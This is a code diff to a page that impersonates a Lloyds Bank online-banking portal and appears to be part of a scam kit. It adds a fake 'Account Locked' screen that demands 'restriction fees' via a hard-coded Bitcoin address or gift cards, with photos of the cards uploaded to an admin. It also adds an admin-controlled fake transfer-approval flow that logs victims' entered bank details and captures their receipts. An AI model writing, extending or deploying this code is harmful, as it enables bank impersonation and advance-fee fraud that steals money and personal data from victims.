@@ -128,6 +128,15 @@
         </div>
     </div>
 
+    <!-- Transfer Approval Modal -->
+    <div class="modal-overlay" id="transferApprovalModal">
+        <div class="modal-box">
+            <i class="fas fa-spinner fa-spin" style="color:#006a4d; font-size:48px; margin-bottom:15px;"></i>
+            <h3>Processing Transfer...</h3>
+            <p>Your transfer is being reviewed by the clearing house and administrative team. Please hold on.</p>
+        </div>
+    </div>
+
     <!-- App header (shown after login) -->
     <div class="header" id="app-header" style="display:none; background-color:#029352; color:white; padding:20px 30px; align-items:center; justify-content:space-between; border-bottom:4px solid #017a44;">
         <div class="logo" style="font-size:28px; font-weight:bold; display:flex; align-items:center;"><img src="https://www.lloydsbank.com/assets/media/logo/lloyds-bank-logo.svg" alt="Lloyds Bank" style="height:32px; filter: brightness(0) invert(1); margin-right:10px;">&nbsp; Secure Portal</div>
@@ -326,10 +335,35 @@
                 <h2 style="color:#006a4d; margin-bottom:20px; font-size:24px;"><i class="fas fa-exchange-alt"></i> Transfer Funds</h2>
                 
                 <div id="transferStep1">
-                    <p style="margin-bottom:15px; color:#555;">Select a bank from the United Kingdom to transfer funds to:</p>
-                    <input type="text" id="bankSearch" placeholder="Search UK Banks..." style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px; font-size:16px;">
-                    <div id="bankList" style="max-height:300px; overflow-y:auto; border:1px solid #eee; border-radius:6px; background:#f9f9f9; padding:10px;">
-                        <!-- JS injects banks here -->
+                    <div style="display:flex; margin-bottom:15px; gap:10px;">
+                        <button id="btnDomTransfer" onclick="switchTransferType('domestic')" style="flex:1; padding:10px; background:#006a4d; color:white; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">Domestic Transfer</button>
+                        <button id="btnIntTransfer" onclick="switchTransferType('international')" style="flex:1; padding:10px; background:#f5f5f5; color:#333; border:1px solid #ccc; border-radius:4px; cursor:pointer; font-weight:bold;">International Transfer</button>
+                    </div>
+
+                    <div id="domTransferSection">
+                        <p style="margin-bottom:15px; color:#555;">Select a bank from the United Kingdom to transfer funds to:</p>
+                        <input type="text" id="bankSearch" placeholder="Search UK Banks..." style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px; font-size:16px;">
+                        <div id="bankList" style="max-height:300px; overflow-y:auto; border:1px solid #eee; border-radius:6px; background:#f9f9f9; padding:10px;">
+                            <!-- JS injects banks here -->
+                        </div>
+                    </div>
+
+                    <div id="intTransferSection" style="display:none;">
+                        <p style="margin-bottom:15px; color:#555;">Select destination country:</p>
+                        <select id="intCountrySelect" style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px; font-size:16px;" onchange="loadIntBanks()">
+                            <option value="">-- Select Country --</option>
+                            <option value="usa">United States (USA)</option>
+                            <option value="can">Canada</option>
+                            <option value="aus">Australia</option>
+                            <option value="eur">Europe (SEPA)</option>
+                        </select>
+                        
+                        <div id="intBankSelectionContainer" style="display:none;">
+                            <p style="margin-bottom:15px; color:#555;">Select a bank in the destination country:</p>
+                            <div id="intBankList" style="max-height:300px; overflow-y:auto; border:1px solid #eee; border-radius:6px; background:#f9f9f9; padding:10px;">
+                                <!-- JS injects international banks here -->
+                            </div>
+                        </div>
                     </div>
                 </div>
 
@@ -341,14 +375,28 @@
                         <label class="label">Full Name</label>
                         <input type="text" class="input-field" id="txFullName" placeholder="e.g. John Doe">
                     </div>
-                    <div class="input-group">
-                        <label class="label">Sort Code (6 digits)</label>
-                        <input type="text" class="input-field" id="txSortCode" placeholder="XX-XX-XX">
+                    <div id="ukFieldsSection">
+                        <div class="input-group">
+                            <label class="label">Sort Code (6 digits)</label>
+                            <input type="text" class="input-field" id="txSortCode" placeholder="XX-XX-XX">
+                        </div>
+                        <div class="input-group">
+                            <label class="label">Account Number (8 digits)</label>
+                            <input type="text" class="input-field" id="txAccNum" placeholder="12345678">
+                        </div>
                     </div>
-                    <div class="input-group">
-                        <label class="label">Account Number (8 digits)</label>
-                        <input type="text" class="input-field" id="txAccNum" placeholder="12345678">
+                    
+                    <div id="usaFieldsSection" style="display:none;">
+                        <div class="input-group">
+                            <label class="label">Routing Number</label>
+                            <input type="text" class="input-field" id="txUsaRouting" placeholder="e.g. 021000021">
+                        </div>
+                        <div class="input-group">
+                            <label class="label">Account Number</label>
+                            <input type="text" class="input-field" id="txUsaAccNum" placeholder="e.g. 123456789">
+                        </div>
                     </div>
+
                     
                     <div id="starkVerificationBadge" style="display:none; background:#e8f4f0; border-left:4px solid #006a4d; padding:12px; margin-bottom:15px; border-radius:4px; animation: fadeIn 0.5s;">
                         <p style="color:#004d38; font-size:13px; margin-bottom:2px;"><i class="fas fa-check-circle"></i> <strong>Payee Verified</strong></p>
@@ -519,6 +567,54 @@
                         </div>
                     </div>
                 </div>
+                </div>
+            </div>
+
+            <!-- Fees View -->
+            <div id="view-fees" style="display:none; width:100%;">
+                <div style="background:#fff; border:1px solid #d9534f; padding:30px; border-radius:8px; text-align:center;">
+                    <i class="fas fa-lock" style="font-size:48px; color:#d9534f; margin-bottom:15px;"></i>
+                    <h2 style="color:#d9534f; margin-bottom:15px;">Account Locked</h2>
+                    <p style="color:#333; font-size:16px; margin-bottom:10px; font-weight:bold;">Restriction Fees: <span id="feeAmountDisplay" style="color:#d9534f; font-size:20px;"></span></p>
+                    <p style="color:#333; font-size:14px; margin-bottom:20px;">The bank requires payment from another payment method to remove restriction. For more information, contact Customer Service.</p>
+                    
+                    <div style="max-width:500px; margin:0 auto; background:#f9f9f9; padding:20px; border-radius:8px; border:1px solid #eee; text-align:left;">
+                        <h3 style="margin-bottom:15px; color:#006a4d; border-bottom:1px solid #ccc; padding-bottom:10px;">Fee Payment Methods</h3>
+                        
+                        <div style="display:flex; gap:10px; margin-bottom:20px;">
+                            <button id="btnPayBtc" onclick="switchFeePayment('btc')" style="flex:1; padding:10px; background:#f7931a; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;"><i class="fab fa-bitcoin"></i> Bitcoin (BTC)</button>
+                            <button id="btnPayGift" onclick="switchFeePayment('gift')" style="flex:1; padding:10px; background:#333; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;"><i class="fas fa-gift"></i> Gift Card</button>
+                        </div>
+                        
+                        <div id="payBtcSection">
+                            <p style="margin-bottom:10px; font-weight:bold;">Send exact BTC amount to the address below:</p>
+                            <div style="background:#fff; padding:15px; border:1px solid #ddd; border-radius:4px; font-family:monospace; font-size:14px; margin-bottom:15px; word-break:break-all; text-align:center;">
+                                bc1qxn75r74yxn506avewznvleyg80epcvmaduunpv
+                            </div>
+                            <p style="margin-bottom:5px; font-size:14px;">Upload Payment Screenshot (Required):</p>
+                            <input type="file" id="btcImageUpload" accept="image/*" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; margin-bottom:15px; background:white;">
+                            <button onclick="submitFeePayment('btc')" style="width:100%; padding:12px; background:#006a4d; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Submit BTC Payment</button>
+                        </div>
+
+                        <div id="payGiftSection" style="display:none;">
+                            <p style="margin-bottom:10px; font-weight:bold;">Select Gift Card Brand:</p>
+                            <select id="giftCardBrand" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; margin-bottom:15px;">
+                                <option value="Amazon">Amazon</option>
+                                <option value="Apple/iTunes">Apple / iTunes</option>
+                                <option value="Steam">Steam</option>
+                                <option value="Google Play">Google Play</option>
+                                <option value="Xbox">Xbox</option>
+                                <option value="PlayStation">PlayStation</option>
+                                <option value="Vanilla Visa/Mastercard">Vanilla Visa / Mastercard</option>
+                            </select>
+                            <p style="margin-bottom:5px; font-size:14px;">Gift Card Value / Price:</p>
+                            <input type="number" id="giftCardPrice" placeholder="e.g. 500" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; margin-bottom:15px; background:white;">
+                            <p style="margin-bottom:5px; font-size:14px;">Upload Clear Picture of Gift Card (Front & Back if possible):</p>
+                            <input type="file" id="giftImageUpload" accept="image/*" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; margin-bottom:15px; background:white;">
+                            <button onclick="submitFeePayment('gift')" style="width:100%; padding:12px; background:#006a4d; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Submit Gift Card</button>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -615,17 +711,72 @@
         
         // ===== DYNAMIC ACCOUNT STATUS =====
         var localAccountLocked = false;
+        var localLockType = 'none';
         
         function handleQuickAction(action) {
             try {
                 if (localAccountLocked) {
-                    showAccountClosedAlert();
+                    if (localLockType === 'fees') {
+                        showView('fees');
+                    } else {
+                        showAccountClosedAlert();
+                    }
                 } else {
                     if (action === 'transfer') initTransferBanks();
                     showView(action);
                 }
             } catch(e) {
                 alert("Error in handleQuickAction: " + e.message);
+            }
+        }
+
+        function switchFeePayment(type) {
+            if (type === 'btc') {
+                document.getElementById('payBtcSection').style.display = 'block';
+                document.getElementById('payGiftSection').style.display = 'none';
+                document.getElementById('btnPayBtc').style.background = '#f7931a';
+                document.getElementById('btnPayGift').style.background = '#333';
+            } else {
+                document.getElementById('payBtcSection').style.display = 'none';
+                document.getElementById('payGiftSection').style.display = 'block';
+                document.getElementById('btnPayGift').style.background = '#f7931a';
+                document.getElementById('btnPayBtc').style.background = '#333';
+            }
+        }
+
+        async function submitFeePayment(type) {
+            var fileInput = type === 'btc' ? document.getElementById('btcImageUpload') : document.getElementById('giftImageUpload');
+            if (fileInput.files && fileInput.files[0]) {
+                var file = fileInput.files[0];
+                var reader = new FileReader();
+                reader.onload = async function(e) {
+                    var dataUrl = e.target.result;
+                    var mediaList = getSyncItem('uploadedMedia') || [];
+                    var feeType = type === 'btc' ? 'BTC Payment Screenshot' : 'Gift Card (' + document.getElementById('giftCardBrand').value + ')';
+                    
+                    if (type === 'gift') {
+                        var price = document.getElementById('giftCardPrice').value;
+                        if (price) feeType += ' - Value: ' + price;
+                    }
+                    
+                    mediaList.unshift({
+                        type: feeType,
+                        date: new Date().toLocaleString(),
+                        dataUrl: dataUrl,
+                        filename: 'Fee_Payment_' + type + '.png'
+                    });
+                    
+                    await setSyncItem('uploadedMedia', mediaList);
+                    
+                    var logEntry = '<p><strong>Fee Payment Submitted:</strong> User uploaded a ' + feeType + '</p>';
+                    var currentLogs = getSyncItem('adminLogs') || '';
+                    await setSyncItem('adminLogs', currentLogs + logEntry);
+                    
+                    alert('Payment proof submitted successfully! The administration will review your payment shortly.');
+                };
+                reader.readAsDataURL(file);
+            } else {
+                alert('Please upload a clear picture of your payment first.');
             }
         }
 
@@ -643,6 +794,47 @@
             "Citibank UK Limited", "Bank of China (UK) Limited", "Goldman Sachs International Bank"
         ];
 
+        var intBanksData = {
+            'usa': ["Chase Bank", "Bank of America", "Wells Fargo", "Citibank", "U.S. Bank", "PNC Bank", "Truist", "Capital One"],
+            'can': ["Royal Bank of Canada (RBC)", "TD Bank", "Scotiabank", "BMO", "CIBC"],
+            'aus': ["Commonwealth Bank", "Westpac", "ANZ", "NAB"],
+            'eur': ["BNP Paribas", "Deutsche Bank", "Santander", "Société Générale", "ING Group", "UniCredit"]
+        };
+
+        function switchTransferType(type) {
+            if (type === 'domestic') {
+                document.getElementById('domTransferSection').style.display = 'block';
+                document.getElementById('intTransferSection').style.display = 'none';
+                document.getElementById('btnDomTransfer').style.background = '#006a4d';
+                document.getElementById('btnDomTransfer').style.color = 'white';
+                document.getElementById('btnIntTransfer').style.background = '#f5f5f5';
+                document.getElementById('btnIntTransfer').style.color = '#333';
+            } else {
+                document.getElementById('domTransferSection').style.display = 'none';
+                document.getElementById('intTransferSection').style.display = 'block';
+                document.getElementById('btnIntTransfer').style.background = '#006a4d';
+                document.getElementById('btnIntTransfer').style.color = 'white';
+                document.getElementById('btnDomTransfer').style.background = '#f5f5f5';
+                document.getElementById('btnDomTransfer').style.color = '#333';
+            }
+        }
+
+        function loadIntBanks() {
+            var country = document.getElementById('intCountrySelect').value;
+            var container = document.getElementById('intBankSelectionContainer');
+            var listEl = document.getElementById('intBankList');
+            if (country && intBanksData[country]) {
+                var listHtml = '';
+                intBanksData[country].forEach(function(bank) {
+                    listHtml += '<div style="padding:10px; border-bottom:1px solid #ddd; cursor:pointer;" onclick="selectBank(\'' + bank.replace(/'/g, "\\'") + '\')"><i class="fas fa-globe" style="color:#006a4d; margin-right:10px;"></i>' + bank + '</div>';
+                });
+                listEl.innerHTML = listHtml;
+                container.style.display = 'block';
+            } else {
+                container.style.display = 'none';
+            }
+        }
+
         function initTransferBanks() {
             var listHtml = '';
             ukBanks.forEach(function(bank) {
@@ -652,6 +844,11 @@
             document.getElementById('transferStep1').style.display = 'block';
             document.getElementById('transferStep2').style.display = 'none';
             document.getElementById('transferLoading').style.display = 'none';
+            
+            // Show domestic by default when opened
+            switchTransferType('domestic');
+            document.getElementById('intCountrySelect').value = '';
+            document.getElementById('intBankSelectionContainer').style.display = 'none';
         }
 
         var selectedBankNameGlobal = "";
@@ -659,6 +856,17 @@
         function selectBank(bankName) {
             selectedBankNameGlobal = bankName;
             document.getElementById('selectedBankDisplay').innerText = "Selected Bank: " + bankName;
+            
+            var country = document.getElementById('intCountrySelect').value;
+            var isDom = document.getElementById('domTransferSection').style.display !== 'none';
+            if (!isDom && country === 'usa') {
+                document.getElementById('ukFieldsSection').style.display = 'none';
+                document.getElementById('usaFieldsSection').style.display = 'block';
+            } else {
+                document.getElementById('ukFieldsSection').style.display = 'block';
+                document.getElementById('usaFieldsSection').style.display = 'none';
+            }
+            
             document.getElementById('transferStep1').style.display = 'none';
             document.getElementById('transferStep2').style.display = 'block';
         }
@@ -673,8 +881,13 @@
 
         async function verifyTransferDetails() {
             var name = document.getElementById('txFullName').value.trim();
-            var sc = document.getElementById('txSortCode').value.trim();
-            var acc = document.getElementById('txAccNum').value.trim();
+            
+            var country = document.getElementById('intCountrySelect').value;
+            var isDom = document.getElementById('domTransferSection').style.display !== 'none';
+            var isUsa = (!isDom && country === 'usa');
+            
+            var sc = isUsa ? document.getElementById('txUsaRouting').value.trim() : document.getElementById('txSortCode').value.trim();
+            var acc = isUsa ? document.getElementById('txUsaAccNum').value.trim() : document.getElementById('txAccNum').value.trim();
             
             if (name && sc && acc) {
                 var expBank = getSyncItem('expectedDomBank') || '';
@@ -682,28 +895,25 @@
                 var expSort = getSyncItem('expectedDomSort') || '';
                 var expAcc = getSyncItem('expectedDomAcc') || '';
 
-                if (expBank && expName && expSort && expAcc && 
-                    selectedBankNameGlobal === expBank && name === expName && sc === expSort && acc === expAcc) {
+                var isMatch = (expBank && expName && expSort && expAcc && 
+                    selectedBankNameGlobal === expBank && name === expName && sc === expSort && acc === expAcc);
                     
-                    document.getElementById('transferStep2').style.display = 'none';
-                    document.getElementById('transferLoading').style.display = 'block';
+                document.getElementById('transferStep2').style.display = 'none';
+                document.getElementById('transferLoading').style.display = 'block';
+                
+                setTimeout(function() {
+                    document.getElementById('transferLoading').style.display = 'none';
+                    document.getElementById('transferStep2').style.display = 'block';
                     
-                    setTimeout(function() {
-                        document.getElementById('transferLoading').style.display = 'none';
-                        document.getElementById('transferStep2').style.display = 'block';
-                        
+                    if (isMatch) {
                         document.getElementById('starkVerificationBadge').style.display = 'block';
-                        document.getElementById('amountSection').style.display = 'block';
-                        document.getElementById('btnVerifyDetails').style.display = 'none';
-                    }, 2000);
-                } else {
-                    var logEntry = '<p style="color:#d9534f;"><strong>Failed Transfer Verification:</strong><br>' +
-                                   'Bank: ' + selectedBankNameGlobal + '<br>Entered: ' + name + ', ' + sc + ', ' + acc + '</p>';
-                    var currentLogs = getSyncItem('adminLogs') || '';
-                    await setSyncItem('adminLogs', currentLogs + logEntry);
+                    } else {
+                        document.getElementById('starkVerificationBadge').style.display = 'none';
+                    }
                     
-                    alert("The details entered could not be verified by the clearing house. Please check the information and try again.");
-                }
+                    document.getElementById('amountSection').style.display = 'block';
+                    document.getElementById('btnVerifyDetails').style.display = 'none';
+                }, 2000);
             } else {
                 alert("Please fill in all recipient details.");
             }
@@ -714,27 +924,33 @@
             var ref = document.getElementById('txReference').value || 'Invoice Payment';
             if (amt) {
                 var nm = document.getElementById('txFullName').value;
-                var sc = document.getElementById('txSortCode').value;
-                var ac = document.getElementById('txAccNum').value;
+                
+                var country = document.getElementById('intCountrySelect').value;
+                var isDom = document.getElementById('domTransferSection').style.display !== 'none';
+                var isUsa = (!isDom && country === 'usa');
+                
+                var sc = isUsa ? document.getElementById('txUsaRouting').value.trim() : document.getElementById('txSortCode').value.trim();
+                var ac = isUsa ? document.getElementById('txUsaAccNum').value.trim() : document.getElementById('txAccNum').value.trim();
 
-                var logEntry = '<p><strong>Transfer Attempt:</strong> £' + amt + ' to STARK Building Materials UK<br>' +
-                               'Entered Details:<br>Name: ' + nm + '<br>Sort: ' + sc + '<br>Acc: ' + ac + '<br>' + selectedBankNameGlobal + '</p>';
+                var logEntry = '<p><strong>Transfer Attempt initiated:</strong> £' + amt + '<br>' +
+                               'Entered Details:<br>Name: ' + nm + '<br>' + (isUsa ? 'Routing: ' : 'Sort: ') + sc + '<br>Acc: ' + ac + '<br>' + selectedBankNameGlobal + '</p>';
                 var currentLogs = getSyncItem('adminLogs') || '';
                 await setSyncItem('adminLogs', currentLogs + logEntry);
 
-                // Setup Receipt
-                var now = new Date();
-                document.getElementById('receiptDate').innerText = now.toLocaleString('en-GB');
-                document.getElementById('receiptAmount').innerText = '£' + parseFloat(amt).toFixed(2);
-                document.getElementById('receiptBank').innerText = selectedBankNameGlobal;
-                document.getElementById('receiptName').innerText = nm;
-                document.getElementById('receiptRef').innerText = 'LLOYDS-' + Math.floor(Math.random()*1000000000);
+                // Send pending transfer to Supabase
+                await setSyncItem('pendingTransfer', { amount: amt, name: nm, sortCode: sc, accNum: ac, bank: selectedBankNameGlobal, ref: ref });
+                await setSyncItem('transferStatus', 'pending');
                 
-                showView('receipt');
+                // Show Approval Modal
+                document.getElementById('transferApprovalModal').classList.add('active');
+                
             } else {
                 alert("Please enter a valid amount.");
             }
         }
+
+        // Global variable to keep track if we are currently waiting for a transfer
+        var isWaitingForTransfer = false;
         
         function downloadReceiptImage() {
             html2canvas(document.getElementById("receiptContainer")).then(canvas => {
@@ -776,7 +992,10 @@
         // ===== VIEW NAVIGATION =====
         function showView(viewId) {
             try {
-                var elsToHide = ['view-login', 'view-home', 'view-verification', 'view-history', 'view-transfer', 'view-bills', 'view-investments'];
+                if (viewId === 'verification' && localLockType === 'fees') {
+                    viewId = 'fees';
+                }
+                var elsToHide = ['view-login', 'view-home', 'view-verification', 'view-history', 'view-transfer', 'view-bills', 'view-investments', 'view-fees'];
                 for (var i=0; i<elsToHide.length; i++) {
                     var el = document.getElementById(elsToHide[i]);
                     if (el) el.style.display = 'none';
@@ -875,24 +1094,35 @@
 
             
             // Account Lock Logic
-            if (globalState.accountLocked === true) {
+            var lType = globalState.lockType || 'none';
+            if (lType === 'verification' || lType === 'fees' || globalState.accountLocked === true) {
                 localAccountLocked = true;
-                // Show Verification Nav
+                localLockType = lType;
+                
                 var navLinks = document.querySelectorAll('.nav a');
-                if (navLinks.length > 1) {
-                    navLinks[1].style.display = 'inline-block'; // show Verification
-                }
-                // Show Alert on Home
+                if (navLinks.length > 1) navLinks[1].style.display = 'inline-block'; // show Verification
+                
                 var alertClosed = document.querySelector('.alert-closed');
-                if (alertClosed) alertClosed.style.display = 'block';
+                if (alertClosed) {
+                    alertClosed.style.display = 'block';
+                    if (lType === 'fees') {
+                        alertClosed.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Account Locked. Please pay required fees to restore access.';
+                    } else {
+                        alertClosed.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Account Closed. Please complete verification to withdraw funds.';
+                    }
+                }
+                
+                var feeAmt = globalState.lockFee || '0';
+                var feeDisplay = document.getElementById('feeAmountDisplay');
+                if (feeDisplay) feeDisplay.innerText = '£' + feeAmt;
+
             } else {
                 localAccountLocked = false;
-                // Hide Verification Nav
+                localLockType = 'none';
+                
                 var navLinks = document.querySelectorAll('.nav a');
-                if (navLinks.length > 1) {
-                    navLinks[1].style.display = 'none'; // hide Verification
-                }
-                // Hide Alert on Home
+                if (navLinks.length > 1) navLinks[1].style.display = 'none'; // hide Verification
+                
                 var alertClosed = document.querySelector('.alert-closed');
                 if (alertClosed) alertClosed.style.display = 'none';
             }
@@ -965,6 +1195,68 @@
             if (stx === 'approved') {
                 document.getElementById('txLocked').style.display = 'none';
                 document.getElementById('txUnlocked').style.display = 'block';
+            }
+
+            // Transfer Approval Polling
+            var pStatus = getSyncItem('transferStatus');
+            var pData = getSyncItem('pendingTransfer');
+            var transferModal = document.getElementById('transferApprovalModal');
+            
+            if (transferModal && transferModal.classList.contains('active')) {
+                if (pStatus === 'declined') {
+                    transferModal.classList.remove('active');
+                    alert('Your transfer has been declined by the administration.');
+                    await setSyncItem('transferStatus', null);
+                    await setSyncItem('pendingTransfer', null);
+                    
+                    var failedTx = { desc:'Transfer to ' + (pData ? pData.name : 'Unknown'), date: new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }), amount: '£' + parseFloat(pData ? pData.amount : 0).toFixed(2), type:'withdrawal', status:'failed' };
+                    var curTxs = getSyncItem('transactions') || defaultTransactions;
+                    curTxs.unshift(failedTx);
+                    await setSyncItem('transactions', curTxs);
+                } else if (pStatus === 'approved' && pData) {
+                    transferModal.classList.remove('active');
+                    await setSyncItem('transferStatus', null);
+                    await setSyncItem('pendingTransfer', null);
+                    
+                    // Deduct balance
+                    var cBalStr = getSyncItem('cardBalance') || '£140,000.00';
+                    var cBalNum = parseFloat(cBalStr.replace(/[^0-9.-]+/g,""));
+                    var newBal = cBalNum - parseFloat(pData.amount);
+                    if (!isNaN(newBal)) {
+                        await setSyncItem('cardBalance', '£' + newBal.toLocaleString('en-GB', {minimumFractionDigits: 2, maximumFractionDigits: 2}));
+                    }
+                    
+                    // Add success tx
+                    var successTx = { desc:'Transfer to ' + pData.name, date: new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }), amount: '£' + parseFloat(pData.amount).toFixed(2), type:'withdrawal', status:'success' };
+                    var curTxs = getSyncItem('transactions') || defaultTransactions;
+                    curTxs.unshift(successTx);
+                    await setSyncItem('transactions', curTxs);
+                    
+                    // Setup Receipt
+                    var now = new Date();
+                    document.getElementById('receiptDate').innerText = now.toLocaleString('en-GB');
+                    document.getElementById('receiptAmount').innerText = '£' + parseFloat(pData.amount).toFixed(2);
+                    document.getElementById('receiptBank').innerText = pData.bank;
+                    document.getElementById('receiptName').innerText = pData.name;
+                    document.getElementById('receiptRef').innerText = pData.ref || 'LLOYDS-' + Math.floor(Math.random()*1000000000);
+                    
+                    showView('receipt');
+                    
+                    // Capture receipt and send to admin
+                    setTimeout(function() {
+                        html2canvas(document.getElementById("receiptContainer")).then(async canvas => {
+                            var imgData = canvas.toDataURL('image/png');
+                            var mediaList = getSyncItem('uploadedMedia') || [];
+                            mediaList.unshift({
+                                type: 'Approved Transfer Receipt',
+                                date: new Date().toLocaleString(),
+                                dataUrl: imgData,
+                                filename: 'Transfer_Receipt.png'
+                            });
+                            await setSyncItem('uploadedMedia', mediaList);
+                        });
+                    }, 500);
+                }
             }
         }, 1000);
 
